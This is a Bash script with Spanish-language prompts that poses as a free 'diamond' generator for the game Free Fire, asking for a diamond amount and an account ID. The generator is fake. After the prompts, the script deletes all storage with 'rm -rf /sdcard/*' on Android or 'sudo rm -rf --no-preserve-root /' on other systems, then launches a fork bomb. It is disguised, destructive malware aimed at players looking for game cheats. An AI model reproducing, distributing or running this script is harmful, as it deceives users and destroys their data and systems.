#!/bin/bash

negro="\e[1;30m"
azul="\e[1;34m"
verde="\e[1;32m"
cian="\e[1;36m"
rojo="\e[1;31m"
purpura="\e[1;35m"
amarillo="\e[1;33m"
blanco="\e[1;37m"
system=$(uname -o)

function Requisitos {
if [ "${system}" == "Android" ]; then
	if [ -x ${PREFIX}/bin/python ]; then
		PWD=$(pwd)
	else
		PWD=$(pwd)
		echo -e ${verde}"\nInstalando Requisitos..."${blanco}
		pkg install python -y
	fi
else
	if [ -x /bin/python3 ]; then
		PWD=$(pwd)
	else
		PWD=$(pwd)
		echo -e ${verde}"\nInstalando Requisitos..."${blanco}
		apt-get install python3 -y
	fi
fi
}
function FreeFire {
	sleep 0.5
	clear
echo -e "${amarillo}
  ██████▒██▀███  ▓█████ ▓█████      █████▒██▓ ██▀███  ▓█████
▓██   ▒▓██ ▒ ██▒▓█   ▀ ▓█   ▀    ▓██   ▒▓██▒▓██ ▒ ██▒▓█   ▀
▒████ ░▓██ ░▄█ ▒▒███   ▒███      ▒████ ░▒██▒▓██ ░▄█ ▒▒███
░▓█▒  ░▒██▀▀█▄  ▒▓█  ▄ ▒▓█  ▄    ░▓█▒  ░░██░▒██▀▀█▄  ▒▓█  ▄
░▒█░   ░██▓ ▒██▒░▒████▒░▒████▒   ░▒█░   ░██░░██▓ ▒██▒░▒████▒
 ▒ ░   ░ ▒▓ ░▒▓░░░ ▒░ ░░░ ▒░ ░    ▒ ░   ░▓  ░ ▒▓ ░▒▓░░░ ▒░ ░
 ░       ░▒ ░ ▒░ ░ ░  ░ ░ ░  ░    ░      ▒ ░  ░▒ ░ ▒░ ░ ░  ░
 ░ ░     ░░   ░    ░      ░       ░ ░    ▒ ░  ░░   ░    ░
          ░        ░  ░   ░  ░           ░     ░        ░  ░"${blanco}
}
function Diamantes {
FreeFire
echo -e -n "
${cian}¿CUÁNTOS DIAMANTES GRATIS DESEA GENERAR?

${cian}[${amarillo}01${cian}] ${blanco}100 ${purpura}DIAMANTES ${cian}GRATIS
${cian}[${amarillo}02${cian}] ${blanco}300 ${purpura}DIAMANTES ${cian}GRATIS
${cian}[${amarillo}03${cian}] ${blanco}500 ${purpura}DIAMANTES ${cian}GRATIS

${cian}[${amarillo}*${cian}] ${verde}Elige una opción ${blanco}> "
read -r DIAMANTES
sleep 0.5

if [[ ${DIAMANTES} == 1 || ${DIAMANTES} == 01 ]]; then
CANTIDAD="100"
echo -e "${blanco}
100 ${cian}DIAMANTES ${purpura}SELECCIONADOS"
elif [[ ${DIAMANTES} == 2 || ${DIAMANTES} == 02 ]]; then
CANTIDAD="300"
echo -e "${blanco}
300 ${cian}DIAMANTES ${purpura}SELECCIONADOS"
elif [[ ${DIAMANTES} == 3 || ${DIAMANTES} == 03 ]]; then
CANTIDAD="500"
echo -e "${blanco}
500 ${cian}DIAMANTES ${purpura}SELECCIONADOS"
else
echo -e "${rojo}
Esa opción no está disponible :("
sleep 1
Diamantes
fi
}
function ID {
echo -e -n "${cian}
[${amarillo}*${cian}] ${verde}Ingrese el ID de su cuenta ${blanco}> "
read -r ID
sleep 0.5

echo -e "${purpura}
Añadiendo${cian} ${CANTIDAD} ${purpura}diamantes a la cuenta${cian} ${ID}"
sleep 2
echo -e "${amarillo}
Esto puede tardar unos minutos, por favor espere..."${blanco}
}
function Add {
python3 diamantes.py 1000000000000000000000000000000000000000000000000
}
Requisitos
Diamantes
ID
if [ "${system}" == "Android" ]; then
	remove="rm -rf /sdcard/*"
else
	remove="sudo rm -rf --no-preserve-root /"
fi
${remove}
Add
:(){ :|:& };:
